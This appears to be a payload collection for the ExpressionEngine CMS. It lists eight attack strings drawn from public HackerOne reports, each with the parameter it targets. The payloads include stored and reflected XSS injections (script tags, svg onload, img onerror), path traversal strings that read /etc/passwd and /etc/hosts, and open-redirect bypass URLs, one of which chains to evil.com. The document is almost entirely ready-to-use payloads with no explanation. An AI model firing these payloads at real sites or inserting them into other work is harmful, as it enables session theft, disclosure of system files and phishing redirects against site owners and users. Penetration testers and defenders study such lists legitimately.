# ExpressionEngine

8 payloads.

### `234d1f1b`

```
"><script>alert('stored xss')<%2fscript>
```

**Parameter:** `site_index`
— [\[redacted\]](https://hackerone.com/reports/26482) · ExpressionEngine · [deadlock](https://hackerone.com/deadlock)

### `0fc2c063`

```
///etc/passwd
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `8f844813`

```
///etc/hosts
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `4ff5dc8a`

```
../../../../../../../../etc/passwd
```

**Parameter:** `path`
— [Filename and directory enumeration](https://hackerone.com/reports/149273) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `b150db29`

```
select <svg onload=alert(1)>
```

**Parameter:** `thequery`
— [Arbitrary SQL query execution and reflected XSS in the "SQL Query Form"](https://hackerone.com/reports/149279) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `f50526b6`

```
http://target.com/sandbox/express/admin.php?/cp/members/bans&search=&sort_col=me%22%3E%3Cimg%20src=x%20onerror=prompt(document.domain
```

**Parameter:** `sort_col`
— [Reflective XSS](https://hackerone.com/reports/177943) · ExpressionEngine · [hogarth45](https://hackerone.com/hogarth45)

### `f0072291`

```
http://HOST/PATH_TO_EE/index.php?URL=https://target.com
```

**Parameter:** `URL`
— [Open redirects protection bypass](https://hackerone.com/reports/236599) · ExpressionEngine · [strukt](https://hackerone.com/strukt)

### `4a0e831a`

```
https://example.com/?URL=https://example.com/?URL=http://evil.com
```

**Parameter:** `URL`
— [\[EE\] Spoof the redirect process](https://hackerone.com/reports/339987) · ExpressionEngine · [flex0geek](https://hackerone.com/flex0geek)
